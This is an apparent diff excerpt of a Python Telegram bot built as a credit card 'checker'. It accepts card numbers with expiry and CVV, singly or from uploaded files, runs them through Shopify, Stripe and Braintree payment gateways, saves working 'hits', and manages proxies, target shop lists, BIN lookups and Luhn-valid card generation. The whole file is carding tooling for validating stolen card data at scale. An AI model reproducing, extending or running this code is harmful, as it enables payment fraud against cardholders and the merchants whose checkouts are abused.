+LINE_DASH = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+LINE_DOT = "┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈"
+
+# Status indicators
+ICON_APPROVED = "✅"
+ICON_DECLINED = "❌"
+ICON_WARNING = "⚠️"
+ICON_ERROR = "🔴"
+ICON_LIVE = "💚"
+ICON_CHARGE = "💰"
+ICON_3DS = "🔐"
+ICON_CVV = "🔶"
+ICON_FUNDS = "💸"
+ICON_CLOCK = "⏱"
+ICON_CARD = "💳"
+ICON_BIN = "🏦"
+ICON_GLOBE = "🌍"
+
+def get_bot_header(gateway="shopify"):
+    """Generate a styled header for bot messages"""
+    if gateway == "stripe_auth":
+        return f"""🔓 *{BOT_NAME} {BOT_VERSION}*
+⚡ *STRIPE AUTH GATEWAY* ─ FREE
+{LINE_DASH}"""
+    return f"""🛒 *{BOT_NAME} {BOT_VERSION}*
+⚡ *SHOPIFY GATEWAY*
+{LINE_DASH}"""
+
+def get_bot_footer():
+    """Generate a styled footer"""
+    return f"""
+{LINE_THIN}
+🤖 {BOT_NAME} {BOT_VERSION} │ /help"""
+
+def get_status_emoji(category):
+    """Get appropriate emoji set for a card result category"""
+    status_map = {
+        'CHARGE': ('💰', '✅ 𝗖𝗛𝗔𝗥𝗚𝗘𝗗', '🟢'),
+        'LIVE': ('💚', '✅ 𝗟𝗜𝗩𝗘', '🟢'),
+        '3DS': ('🔐', '✅ 𝟯𝗗𝗦 𝗥𝗘𝗤𝗨𝗜𝗥𝗘𝗗', '🟡'),
+        'CVV': ('🔶', '⚠️ 𝗖𝗩𝗩 𝗜𝗡𝗖𝗢𝗥𝗥𝗘𝗖𝗧', '🟡'),
+        'FUNDS': ('💸', '⚠️ 𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 𝗙𝗨𝗡𝗗𝗦', '🟡'),
+        'DECLINED': ('❌', '❌ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗', '🔴'),
+        'ERROR': ('🔴', '🔴 𝗘𝗥𝗥𝗢𝗥', '🔴'),
+        'UNKNOWN': ('❓', '❓ 𝗨𝗡𝗞𝗡𝗢𝗪𝗡', '⚪'),
+    }
+    return status_map.get(category, status_map['UNKNOWN'])
+
+# ============================================
+# STYLIZED TEXT
+# ============================================
+
+def stylize_text(text):
+    style_map = {
+        'A': '𝗔', 'B': '𝗕', 'C': '𝗖', 'D': '𝗗', 'E': '𝗘', 'F': '𝗙', 'G': '𝗚', 'H': '𝗛', 'I': '𝗜',
+        'J': '𝗝', 'K': '𝗞', 'L': '𝗟', 'M': '𝗠', 'N': '𝗡', 'O': '𝗢', 'P': '𝗣', 'Q': '𝗤', 'R': '𝗥',
+        'S': '𝗦', 'T': '𝗧', 'U': '𝗨', 'V': '𝗩', 'W': '𝗪', 'X': '𝗫', 'Y': '𝗬', 'Z': '𝗭',
+        'a': '𝗮', 'b': '𝗯', 'c': '𝗰', 'd': '𝗱', 'e': '𝗲', 'f': '𝗳', 'g': '𝗴', 'h': '𝗵', 'i': '𝗶',
+        'j': '𝗷', 'k': '𝗸', 'l': '𝗹', 'm': '𝗺', 'n': '𝗻', 'o': '𝗼', 'p': '𝗽', 'q': '𝗾', 'r': '𝗿',
+        's': '𝘀', 't': '𝘁', 'u': '𝘂', 'v': '𝘃', 'w': '𝘄', 'x': '𝘅', 'y': '𝘆', 'z': '𝘇',
+        '0': '𝟬', '1': '𝟭', '2': '𝟮', '3': '𝟯', '4': '𝟰', '5': '𝟱', '6': '𝟲', '7': '𝟳', '8': '𝟴', '9': '𝟵'
+    }
+    return ''.join(style_map.get(c, c) for c in text)
+
+# ============================================
+# PROGRESS BAR
+# ============================================
+
+def create_progress_bar(current, total, width=20):
+    if total == 0:
+        return '░' * width + ' 0%'
+    percentage = current / total
+    filled = int(width * percentage)
+    empty = width - filled
+    pct = int(percentage * 100)
+    return '█' * filled + '░' * empty + f' {pct}%'
+
+# ============================================
+# FORMAT RESPONSES
+# ============================================
+
+def format_chk_response(card_data, category, status_msg, response_msg, price, gateway, elapsed, bin_info):
+    cc = card_data.get('cc', '')
+    month = card_data.get('month', '')
+    year = card_data.get('year', '')
+    cvv = card_data.get('cvv', '')
+    
+    icon, status_display, dot = get_status_emoji(category)
+    
+    # Status title based on category
+    if category == 'CHARGE':
+        title = f"\u26a1 {stylize_text('Card Charged')}"
+    elif category == '3DS':
+        title = f"\u26a1 {stylize_text('3DS Required')}"
+    elif category == 'CVV':
+        title = f"\u26a1 {stylize_text('CVV Incorrect')}"
+    elif category == 'FUNDS':
+        title = f"\u26a1 {stylize_text('Insufficient Funds')}"
+    elif category == 'DECLINED':
+        title = f"\u26a1 {stylize_text('Card Declined')}"
+    else:
+        title = f"\u26a1 {stylize_text('Unknown Response')}"
+    
+    message = f"{title}\n\n"
+    message += f"\u26a1 {stylize_text('CC')}: {cc}|{month}|{year}|{cvv}\n"
+    message += f"\u26a1 {stylize_text('Gate')}: {stylize_text('Shopify Payments')}\n"
+    message += f"\u26a1 {stylize_text('Response')}: {stylize_text(response_msg if response_msg else status_msg)}\n"
+    message += f"\u26a1 {stylize_text('Price')}: {stylize_text(price)}\n"
+    
+    if bin_info:
+        message += f"\n\u26a1 {stylize_text('BIN Info')}:\n"
+        brand = bin_info.get('brand', bin_info.get('info', 'Unknown'))
+        card_type = bin_info.get('type', 'Unknown')
+        level = bin_info.get('level', '')
+        bank = bin_info.get('bank', 'Unknown')
+        country = bin_info.get('country', 'Unknown')
+        message += f"\u26a1 {stylize_text('Brand')}: {stylize_text(str(brand).upper())}\n"
+        message += f"\u26a1 {stylize_text('Type')}: {stylize_text(str(card_type).upper())}\n"
+        if level:
+            message += f"\u26a1 {stylize_text('Level')}: {stylize_text(str(level).upper())}\n"
+        message += f"\u26a1 {stylize_text('Bank')}: {stylize_text(str(bank).upper())}\n"
+        message += f"\u26a1 {stylize_text('Country')}: {country}\n"
+    
+    message += f"\n\u26a1 {stylize_text('Time')}: {stylize_text(str(elapsed) + 's')}"
+    message += f"\n\u26a1 {stylize_text('Checked by')}: {BOT_NAME} {BOT_VERSION}"
+    return message
+
+def format_stripe_response(card_data, category, status_msg, response_msg, price, gateway, elapsed, bin_info):
+    cc = card_data.get('cc', '')
+    month = card_data.get('month', '')
+    year = card_data.get('year', '')
+    cvv = card_data.get('cvv', '')
+    
+    icon, status_display, dot = get_status_emoji(category)
+    
+    # Status title based on category
+    if category == 'LIVE':
+        title = f"\u26a1 {stylize_text('Card Live')}"
+    elif category == '3DS':
+        title = f"\u26a1 {stylize_text('3DS Required')}"
+    elif category == 'CVV':
+        title = f"\u26a1 {stylize_text('CVV Incorrect')}"
+    elif category == 'DECLINED':
+        title = f"\u26a1 {stylize_text('Card Declined')}"
+    else:
+        title = f"\u26a1 {stylize_text('Unknown Response')}"
+    
+    message = f"{title}\n\n"
+    message += f"\u26a1 {stylize_text('CC')}: {cc}|{month}|{year}|{cvv}\n"
+    message += f"\u26a1 {stylize_text('Gate')}: {stylize_text('Stripe Auth')}\n"
+    message += f"\u26a1 {stylize_text('Response')}: {stylize_text(response_msg if response_msg else status_msg)}\n"
+    message += f"\u26a1 {stylize_text('Price')}: {stylize_text(price)}\n"
+    
+    if bin_info:
+        message += f"\n\u26a1 {stylize_text('BIN Info')}:\n"
+        brand = bin_info.get('brand', bin_info.get('info', 'Unknown'))
+        card_type = bin_info.get('type', 'Unknown')
+        level = bin_info.get('level', '')
+        bank = bin_info.get('bank', 'Unknown')
+        country = bin_info.get('country', 'Unknown')
+        message += f"\u26a1 {stylize_text('Brand')}: {stylize_text(str(brand).upper())}\n"
+        message += f"\u26a1 {stylize_text('Type')}: {stylize_text(str(card_type).upper())}\n"
+        if level:
+            message += f"\u26a1 {stylize_text('Level')}: {stylize_text(str(level).upper())}\n"
+        message += f"\u26a1 {stylize_text('Bank')}: {stylize_text(str(bank).upper())}\n"
+        message += f"\u26a1 {stylize_text('Country')}: {country}\n"
+    
+    message += f"\n\u26a1 {stylize_text('Time')}: {stylize_text(str(elapsed) + 's')}"
+    message += f"\n\u26a1 {stylize_text('Checked by')}: {BOT_NAME} {BOT_VERSION}"
+    return message
+
+def format_sc_response(card_data, category, status_msg, response_msg, price, gateway, elapsed, bin_info):
+    cc = card_data.get('cc', '')
+    month = card_data.get('month', '')
+    year = card_data.get('year', '')
+    cvv = card_data.get('cvv', '')
+    
+    if category == 'CHARGE':
+        title = f"\u26a1 {stylize_text('Card Charged')}"
+    elif category == '3DS':
+        title = f"\u26a1 {stylize_text('3DS Required')}"
+    elif category == 'CVV':
+        title = f"\u26a1 {stylize_text('CVV Incorrect')}"
+    elif category == 'FUNDS':
+        title = f"\u26a1 {stylize_text('Insufficient Funds')}"
+    elif category == 'DECLINED':
+        title = f"\u26a1 {stylize_text('Card Declined')}"
+    else:
+        title = f"\u26a1 {stylize_text('Unknown Response')}"
+    
+    message = f"{title}\n\n"
+    message += f"\u26a1 {stylize_text('CC')}: {cc}|{month}|{year}|{cvv}\n"
+    message += f"\u26a1 {stylize_text('Gate')}: {stylize_text('Stripe Charge $10')}\n"
+    message += f"\u26a1 {stylize_text('Response')}: {stylize_text(response_msg if response_msg else status_msg)}\n"
+    message += f"\u26a1 {stylize_text('Price')}: {stylize_text(price)}\n"
+    
+    if bin_info:
+        message += f"\n\u26a1 {stylize_text('BIN Info')}:\n"
+        brand = bin_info.get('brand', bin_info.get('info', 'Unknown'))
+        card_type = bin_info.get('type', 'Unknown')
+        level = bin_info.get('level', '')
+        bank = bin_info.get('bank', 'Unknown')
+        country = bin_info.get('country', 'Unknown')
+        message += f"\u26a1 {stylize_text('Brand')}: {stylize_text(str(brand).upper())}\n"
+        message += f"\u26a1 {stylize_text('Type')}: {stylize_text(str(card_type).upper())}\n"
+        if level:
+            message += f"\u26a1 {stylize_text('Level')}: {stylize_text(str(level).upper())}\n"
+        message += f"\u26a1 {stylize_text('Bank')}: {stylize_text(str(bank).upper())}\n"
+        message += f"\u26a1 {stylize_text('Country')}: {country}\n"
+    
+    message += f"\n\u26a1 {stylize_text('Time')}: {stylize_text(str(elapsed) + 's')}"
+    message += f"\n\u26a1 {stylize_text('Checked by')}: {BOT_NAME} {BOT_VERSION}"
+    return message
+
+def format_b3_response(card_data, category, status_msg, response_msg, price, gateway, elapsed, bin_info):
+    cc = card_data.get('cc', '')
+    month = card_data.get('month', '')
+    year = card_data.get('year', '')
+    cvv = card_data.get('cvv', '')
+    
+    if category == 'LIVE':
+        title = f"\u26a1 {stylize_text('Card Live')}"
+    elif category == '3DS':
+        title = f"\u26a1 {stylize_text('3DS Required')}"
+    elif category == 'CVV':
+        title = f"\u26a1 {stylize_text('CVV Match')}"
+    elif category == 'DECLINED':
+        title = f"\u26a1 {stylize_text('Card Declined')}"
+    else:
+        title = f"\u26a1 {stylize_text('Unknown Response')}"
+    
+    message = f"{title}\n\n"
+    message += f"\u26a1 {stylize_text('CC')}: {cc}|{month}|{year}|{cvv}\n"
+    message += f"\u26a1 {stylize_text('Gate')}: {stylize_text('Braintree Auth $0')}\n"
+    message += f"\u26a1 {stylize_text('Response')}: {stylize_text(response_msg if response_msg else status_msg)}\n"
+    message += f"\u26a1 {stylize_text('Price')}: {stylize_text(price)}\n"
+    
+    if bin_info:
+        message += f"\n\u26a1 {stylize_text('BIN Info')}:\n"
+        brand = bin_info.get('brand', bin_info.get('info', 'Unknown'))
+        card_type = bin_info.get('type', 'Unknown')
+        level = bin_info.get('level', '')
+        bank = bin_info.get('bank', 'Unknown')
+        country = bin_info.get('country', 'Unknown')
+        message += f"\u26a1 {stylize_text('Brand')}: {stylize_text(str(brand).upper())}\n"
+        message += f"\u26a1 {stylize_text('Type')}: {stylize_text(str(card_type).upper())}\n"
+        if level:
+            message += f"\u26a1 {stylize_text('Level')}: {stylize_text(str(level).upper())}\n"
+        message += f"\u26a1 {stylize_text('Bank')}: {stylize_text(str(bank).upper())}\n"
+        message += f"\u26a1 {stylize_text('Country')}: {country}\n"
+    
+    message += f"\n\u26a1 {stylize_text('Time')}: {stylize_text(str(elapsed) + 's')}"
+    message += f"\n\u26a1 {stylize_text('Checked by')}: {BOT_NAME} {BOT_VERSION}"
+    return message
+
+# ============================================
+# BATCH SENDER
+# ============================================
+
+def send_batch_approved(chat_id, gateway="shopify"):
+    global pending_approved, last_batch_time
+    
+    with batch_lock:
+        if not pending_approved:
+            return
+        
+        batch_messages = pending_approved.copy()
+        pending_approved = []
+    
+    if batch_messages:
+        if gateway == "stripe_auth":
+            gateway_name = "🔓 STRIPE AUTH"
+        else:
+            gateway_name = "✅ SHOPIFY"
+            
+        combined = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        combined += f"{gateway_name} *APPROVED CARDS*\n"
+        combined += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        combined += "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n".join(batch_messages)
+        
+        try:
+            bot.send_message(chat_id, combined, parse_mode='Markdown')
+            last_batch_time = time.time()
+        except:
+            pass
+
+def add_approved_to_batch(chat_id, message, gateway="shopify"):
+    global pending_approved, last_batch_time
+    
+    with batch_lock:
+        pending_approved.append(message)
+        
+        if len(pending_approved) >= BATCH_SIZE:
+            send_batch_approved(chat_id, gateway)
+        else:
+            def delayed_send():
+                time.sleep(BATCH_DELAY)
+                send_batch_approved(chat_id, gateway)
+            
+            if len(pending_approved) == 1:
+                threading.Thread(target=delayed_send, daemon=True).start()
+
+# ============================================
+# MAIN KEYBOARD
+# ============================================
+
+def get_main_keyboard():
+    keyboard = InlineKeyboardMarkup(row_width=3)
+    # ── Row 1: Gateway Checks ──
+    keyboard.row(
+        InlineKeyboardButton("🛒 CHK", callback_data="check"),
+        InlineKeyboardButton("📦 MASS", callback_data="mass"),
+        InlineKeyboardButton("🏆 HITS", callback_data="hits")
+    )
+    # ── Row 2: Stripe Auth ──
+    keyboard.row(
+        InlineKeyboardButton("🔓 AU CHK", callback_data="stripe_check"),
+        InlineKeyboardButton("🔓 AU MASS", callback_data="stripe_mass"),
+        InlineKeyboardButton("🔓 AU HITS", callback_data="stripe_hits")
+    )
+    # ── Row 3: Stripe Charge $10 ──
+    keyboard.row(
+        InlineKeyboardButton("💳 SC CHK", callback_data="sc_check"),
+        InlineKeyboardButton("💳 SC MASS", callback_data="sc_mass"),
+        InlineKeyboardButton("💳 SC HITS", callback_data="sc_hits")
+    )
+    # ── Row 4: Braintree Auth $0 ──
+    keyboard.row(
+        InlineKeyboardButton("🔐 B3 CHK", callback_data="b3_check"),
+        InlineKeyboardButton("🔐 B3 MASS", callback_data="b3_mass"),
+        InlineKeyboardButton("🔐 B3 HITS", callback_data="b3_hits")
+    )
+    # ── Row 5: Infrastructure ──
+    keyboard.row(
+        InlineKeyboardButton("🌐 Sites", callback_data="sites"),
+        InlineKeyboardButton("📡 Proxies", callback_data="proxies"),
+        InlineKeyboardButton("⚡ PX Check", callback_data="px")
+    )
+    # ── Row 4: Settings ──
+    keyboard.row(
+        InlineKeyboardButton("🎮 Mode (Shopify)", callback_data="mode_menu"),
+        InlineKeyboardButton("📊 Stats", callback_data="stats")
+    )
+    # ── Row 5: Utilities ──
+    keyboard.row(
+        InlineKeyboardButton("🏦 BIN Info", callback_data="bin_lookup"),
+        InlineKeyboardButton("🎲 Generate", callback_data="gen_cards"),
+        InlineKeyboardButton("📎 Export", callback_data="export")
+    )
+    # ── Row 6: Tools ──
+    keyboard.row(
+        InlineKeyboardButton("🔒 Permanent", callback_data="permanent_sites"),
+        InlineKeyboardButton("🔧 Fix Sites", callback_data="fix_sites")
+    )
+    # ── Row 7: Control ──
+    keyboard.row(
+        InlineKeyboardButton("🗑️ Clear Cards", callback_data="clear_menu"),
+        InlineKeyboardButton("🛑 STOP", callback_data="stop_mass"),
+        InlineKeyboardButton("❓ Help", callback_data="help")
+    )
+    return keyboard
+
+def safe_send_message(chat_id, text, parse_mode=None, reply_markup=None):
+    try:
+        return bot.send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
+    except:
+        return bot.send_message(chat_id, text, reply_markup=reply_markup)
+
+# ============================================
+# AUTO FILE DETECTION
+# ============================================
+
+@bot.message_handler(content_types=['document'])
+def handle_document(message):
+    global pending_file_cards
+    processing_msg = bot.reply_to(message, "⏳ Analyzing file...")
+    try:
+        file_info = bot.get_file(message.document.file_id)
+        downloaded_file = bot.download_file(file_info.file_path)
+        
+        for encoding in ['utf-8', 'latin-1', 'cp1252']:
+            try:
+                file_content = downloaded_file.decode(encoding)
+                break
+            except:
+                continue
+        else:
+            bot.edit_message_text("❌ Could not read file", chat_id=message.chat.id, message_id=processing_msg.message_id)
+            return
+        
+        lines = file_content.split('\n')
+        cards_list = []
+        sites_list = []
+        proxies_list = []
+        
+        for line in lines:
+            line = line.strip()
+            if not line:
+                continue
+            line_type = detect_line_type(line)
+            if line_type == 'card':
+                parts = line.split('|')
+                if len(parts) >= 4:
+                    cards_list.append(line)
+            elif line_type == 'site':
+                url = extract_url_from_text(line)
+                if not url:
+                    url = normalize_url(line)
+                if url:
+                    sites_list.append(url)
+            elif line_type == 'proxy':
+                clean_proxy = line[4:].strip() if line.startswith('/px ') else line
+                proxies_list.append(clean_proxy)
+        
+        sites_added = 0
+        proxies_added = 0
+        for url in sites_list:
+            if add_site(url):
+                sites_added += 1
+        for proxy in proxies_list:
+            if add_proxy(proxy):
+                proxies_added += 1
+        
+        if not cards_list:
+            response = f"""
+{LINE_DASH}
+📂 *FILE PROCESSED*
+{LINE_DASH}
+
+💳 *Cards found:* 0"""
+            if sites_added > 0 or proxies_added > 0:
+                response += f"\n🌐 *Sites Added:* +{sites_added}\n📡 *Proxies Added:* +{proxies_added}"
+            else:
+                response += "\n\n❌ No cards, sites or proxies found in file"
+            try:
+                bot.edit_message_text(response, chat_id=message.chat.id, message_id=processing_msg.message_id, parse_mode='Markdown')
+            except:
+                bot.edit_message_text(response.replace('*', ''), chat_id=message.chat.id, message_id=processing_msg.message_id)
+            return
+        
+        chat_id = str(message.chat.id)
+        pending_file_cards[chat_id] = {
+            'cards': cards_list,
+            'sites_added': sites_added,
+            'proxies_added': proxies_added,
+            'timestamp': time.time()
+        }
+        
+        response = f"""
+{LINE_DASH}
+📂 *FILE ANALYZED*
+{LINE_DASH}
+
+💳 *Cards found:* {len(cards_list)}"""
+        if sites_added > 0 or proxies_added > 0:
+            response += f"\n🌐 *Sites Added:* +{sites_added}\n📡 *Proxies Added:* +{proxies_added}"
+        
+        response += f"\n\n{LINE_THIN}\n🔽 *Select gateway to load cards:*"
+        
+        markup = InlineKeyboardMarkup(row_width=1)
+        markup.add(
+            InlineKeyboardButton("🛒 Shopify", callback_data="file_gw_shopify"),
+            InlineKeyboardButton("🔓 Stripe Auth (FREE)", callback_data="file_gw_stripe_auth"),
+            InlineKeyboardButton("💳 Stripe Charge $10", callback_data="file_gw_stripe_charge"),
+            InlineKeyboardButton("🔐 Braintree Auth $0", callback_data="file_gw_braintree_auth"),
+            InlineKeyboardButton("📦 ALL GATEWAYS", callback_data="file_gw_all")
+        )
+        
+        try:
+            bot.edit_message_text(response, chat_id=message.chat.id, message_id=processing_msg.message_id,
+                                parse_mode='Markdown', reply_markup=markup)
+        except:
+            bot.edit_message_text(response.replace('*', ''), chat_id=message.chat.id, message_id=processing_msg.message_id,
+                                reply_markup=markup)
+    
+    except Exception as e:
+        bot.edit_message_text(f"❌ Error: {str(e)[:100]}", chat_id=message.chat.id, message_id=processing_msg.message_id)
+
+def process_file_cards_to_gateway(chat_id_str, gateway):
+    global pending_file_cards
+    data = pending_file_cards.get(chat_id_str)
+    if not data:
+        return 0, 0, 0
+    
+    cards_list = data.get('cards', [])
+    added = 0
+    dup = 0
+    
+    for card_line in cards_list:
+        parts = card_line.split('|')
+        if len(parts) < 4:
+            continue
+        cc, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
+        
+        if gateway == "shopify":
+            if add_card(cc, month, year, cvv):
+                added += 1
+            else:
+                dup += 1
+        elif gateway == "stripe_auth":
+            if add_stripe_card(cc, month, year, cvv):
+                added += 1
+            else:
+                dup += 1
+        elif gateway == "stripe_charge":
+            if add_sc_card(cc, month, year, cvv):
+                added += 1
+            else:
+                dup += 1
+        elif gateway == "braintree_auth":
+            if add_b3_card(cc, month, year, cvv):
+                added += 1
+            else:
+                dup += 1
+    
+    return len(cards_list), added, dup
+
+def detect_line_type(line):
+    line = line.strip()
+    if not line:
+        return 'empty'
+    # Strip /px prefix (some proxy files include command prefix)
+    if line.startswith('/px '):
+        line = line[4:].strip()
+    for sep in ['|', '/', ';', ',']:
+        if sep in line:
+            parts = line.split(sep)
+            if len(parts) >= 4:
+                cc = re.sub(r'[^\d]', '', parts[0])
+                if len(cc) >= 13 and len(cc) <= 19 and cc.isdigit():
+                    if validate_luhn(cc):
+                        return 'card'
+    # Check proxy BEFORE site (hostname proxies like host.com:port would match site patterns)
+    if ':' in line:
+        parts = line.split(':')
+        if len(parts) in [2, 4]:
+            host = parts[0].strip()
+            port_str = parts[1].strip()
+            ip_match = re.match(r'^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$', host)
+            hostname_match = re.match(r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$', host)
+            host_valid = False
+            if ip_match:
+                host_valid = all(int(o) <= 255 for o in ip_match.groups())
+            elif hostname_match:
+                host_valid = True
+            if host_valid:
+                try:
+                    port = int(port_str)
+                    port_valid = 1 <= port <= 65535
+                except ValueError:
+                    port_valid = False
+                if port_valid:
+                    return 'proxy'
+    url_patterns = [
+        r'https?://',
+        r'\.com\b', r'\.org\b', r'\.net\b', r'\.shop\b', r'\.store\b',
+        r'\.io\b', r'\.co\b', r'\.uk\b', r'\.de\b', r'\.fr\b', r'\.es\b',
+        r'\.it\b', r'\.ca\b', r'\.au\b', r'\.br\b', r'\.mx\b', r'\.ar\b',
+        r'\.cl\b', r'\.co\.uk\b', r'\.com\.au\b', r'\.com\.br\b',
+        r'\.xyz\b', r'\.online\b', r'\.site\b', r'\.info\b', r'\.biz\b',
+        r'\.us\b', r'\.eu\b', r'\.app\b', r'\.dev\b', r'\.me\b',
+        r'\.in\b', r'\.jp\b', r'\.ru\b', r'\.nl\b', r'\.se\b', r'\.no\b',
+        r'\.ie\b', r'\.pt\b', r'\.pl\b', r'\.cz\b', r'\.at\b', r'\.ch\b',
+        r'myshopify\.com'
+    ]
+    for pattern in url_patterns:
+        if re.search(pattern, line, re.IGNORECASE):
+            return 'site'
+    return 'invalid'
+
+# ============================================
+# NEW UTILITY COMMANDS
+# ============================================
+
+@bot.message_handler(commands=['addproxy'])
+def addproxy_command(message):
+    args = message.text.split(maxsplit=1)
+    if len(args) < 2:
+        bot.reply_to(message, "❌ Format: /addproxy IP:PORT or /addproxy IP:PORT:USER:PASS")
+        return
+    proxy_str = args[1].strip()
+    valid, reason = validate_proxy_format(proxy_str)
+    if not valid:
+        bot.reply_to(message, f"❌ Invalid proxy: {reason}")
+        return
+    if add_proxy(proxy_str):
+        latency_info = ""
+        if check_proxy_socket(proxy_str):
+            lat = proxy_latency.get(proxy_str, 0)
+            latency_info = f"\n⏱ Latency: {lat}ms"
+        bot.reply_to(message, f"✅ Proxy added: `{proxy_str}`{latency_info}", parse_mode='Markdown')
+    else:
+        bot.reply_to(message, "⚠️ Proxy already exists")
+
+# ============================================
+# COMMANDS
+# ============================================
+
+@bot.message_handler(commands=['myid'])
+def myid_command(message):
+    bot.reply_to(message, f"🆔 Your Telegram ID: `{message.from_user.id}`\n\nSend this ID to the bot admin to get access.", parse_mode='Markdown')
+
+@bot.message_handler(commands=['start', 'help'])
+def send_welcome(message):
+    welcome_text = f"""
+╔══════════════════════════════╗
+   🤖 *{BOT_NAME} {BOT_VERSION}*
+   ⚡ Shopify + Stripe Auth + Stripe Charge $10
+╚══════════════════════════════╝
+
+🛒 *━━ SHOPIFY GATEWAY ━━*
+  /chk `cc|mm|yy|cvv` ─ Single check
+  /mass ─ Mass check (pipeline)
+
+🔓 *━━ STRIPE AUTH (FREE) ━━*
+  /au `cc|mm|yy|cvv` ─ Single check
+  /mau ─ Mass check (pipeline)
+
+💳 *━━ STRIPE CHARGE $10 ━━*
+  /sc `cc|mm|yy|cvv` ─ Single check
+  /msc ─ Mass check (pipeline)
+
+🔐 *━━ BRAINTREE AUTH $0 ━━*
+  /b3 `cc|mm|yy|cvv` ─ Single check
+  /mb3 ─ Mass check (pipeline)
+
+🏦 *━━ UTILITIES ━━*
+  /bin `424242` ─ BIN lookup
+  /gen `424242` `10` ─ Generate cards (Luhn)
+  /px ─ Deep proxy check (3 levels)
+  /addproxy `IP:PORT` ─ Add proxy
+  /delproxy ─ Delete proxy
+  /clearshopify ─ Clear Shopify cards
+  /clearau ─ Clear Stripe Auth cards
+  /clearsc ─ Clear Stripe Charge $10 cards
+
+⚙️ *━━ SETTINGS ━━*
+  /stats ─ Statistics
+  /mode ─ Shopify parallel mode (1x/3x/5x)
+
+{LINE_THIN}
+📂 *Send .txt file to auto-load*
+   └ Name with "au" or "stripe" → Stripe Auth
+🧹 *Auto-maintenance active*
+   └ Dead sites auto-cleaned every 50 checks
+"""
+    safe_send_message(message.chat.id, welcome_text, parse_mode='Markdown', reply_markup=get_main_keyboard())
+
+@bot.message_handler(commands=['chk'])
+def chk_command(message):
+    args = message.text.split()
+    if len(args) < 2:
+        bot.reply_to(message, "❌ Format: /chk cc|mm|yy|cvv")
+        return
+    card_str = args[1]
+    if '|' not in card_str and len(args) >= 5:
+        card_str = f"{args[1]}|{args[2]}|{args[3]}|{args[4]}"
+    parts = card_str.split('|')
+    if len(parts) < 4:
+        bot.reply_to(message, "❌ Invalid format. Use: cc|mm|yy|cvv")
+        return
+    cc, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
+    if not cc.isdigit() or len(cc) < 13:
+        bot.reply_to(message, "❌ Invalid card number")
+        return
+    
+    processing_msg = bot.reply_to(message, "⏳ Checking card with Shopify...")
+    
+    bin_info = bin_lookup(cc[:6])
+    category, status_msg, response_msg, price, gateway, elapsed, site_used = check_card_shopify(cc, month, year, cvv)
+    card_data = {'cc': cc, 'month': month, 'year': year, 'cvv': cvv}
+    response = format_chk_response(card_data, category, status_msg, response_msg, price, gateway, elapsed, bin_info)
+    
+    if category in ['CHARGE', '3DS', 'CVV', 'FUNDS']:
+        hit_data = {
+            'cc': cc, 'month': month, 'year': year, 'cvv': cvv,
+            'category': category, 'status_msg': response_msg,
+            'gateway': gateway, 'price': price, 'elapsed': elapsed,
+            'bin_info': bin_info,
+            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        }
+        save_hit(hit_data)
+    
+    try:
+        bot.edit_message_text(response, chat_id=message.chat.id, message_id=processing_msg.message_id, parse_mode='Markdown')
+    except:
+        bot.edit_message_text(response.replace('*', ''), chat_id=message.chat.id, message_id=processing_msg.message_id)
+
+@bot.message_handler(commands=['au'])
+def stripe_command(message):
+    """Comando /au - Check individual con Stripe Auth"""
+    args = message.text.split()
+    if len(args) < 2:
+        bot.reply_to(message, "❌ Format: /au cc|mm|yy|cvv")
+        return
+    card_str = args[1]
+    if '|' not in card_str and len(args) >= 5:
+        card_str = f"{args[1]}|{args[2]}|{args[3]}|{args[4]}"
+    parts = card_str.split('|')
+    if len(parts) < 4:
+        bot.reply_to(message, "❌ Invalid format. Use: cc|mm|yy|cvv")
+        return
+    cc, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
+    
+    processing_msg = bot.reply_to(message, "🔓 *Checking with Stripe Auth Gateway (FREE)...*\n⏳ Please wait...", parse_mode='Markdown')
+    
+    bin_info = bin_lookup(cc[:6])
+    category, status_msg, response_msg, price, gateway, elapsed = check_stripe_auth(cc, month, year, cvv)
+    card_data = {'cc': cc, 'month': month, 'year': year, 'cvv': cvv}
+    response = format_stripe_response(card_data, category, status_msg, response_msg, price, gateway, elapsed, bin_info)
+    
+    if category in ['LIVE', '3DS', 'CVV']:
+        hit_data = {
+            'cc': cc, 'month': month, 'year': year, 'cvv': cvv,
+            'category': category, 'status_msg': status_msg,
+            'response_msg': response_msg,
+            'gateway': gateway, 'price': price, 'elapsed': elapsed,
+            'bin_info': bin_info,
+            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        }
+        save_stripe_hit(hit_data)
+    
+    try:
+        bot.edit_message_text(response, chat_id=message.chat.id, message_id=processing_msg.message_id, parse_mode='Markdown')
+    except:
+        bot.edit_message_text(response.replace('*', ''), chat_id=message.chat.id, message_id=processing_msg.message_id)
+
+# ============================================
+# STRIPE CHARGE INDIVIDUAL COMMAND
+# ============================================
+
+@bot.message_handler(commands=['sc'])
+def sc_command(message):
+    args = message.text.split()
+    if len(args) < 2:
+        bot.reply_to(message, "❌ Format: /sc cc|mm|yy|cvv")
+        return
+    card_str = args[1]
+    if '|' not in card_str and len(args) >= 5:
+        card_str = f"{args[1]}|{args[2]}|{args[3]}|{args[4]}"
+    parts = card_str.split('|')
+    if len(parts) < 4:
+        bot.reply_to(message, "❌ Invalid format. Use: cc|mm|yy|cvv")
+        return
+    cc, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
+    if not cc.isdigit() or len(cc) < 13:
+        bot.reply_to(message, "❌ Invalid card number")
+        return
+    
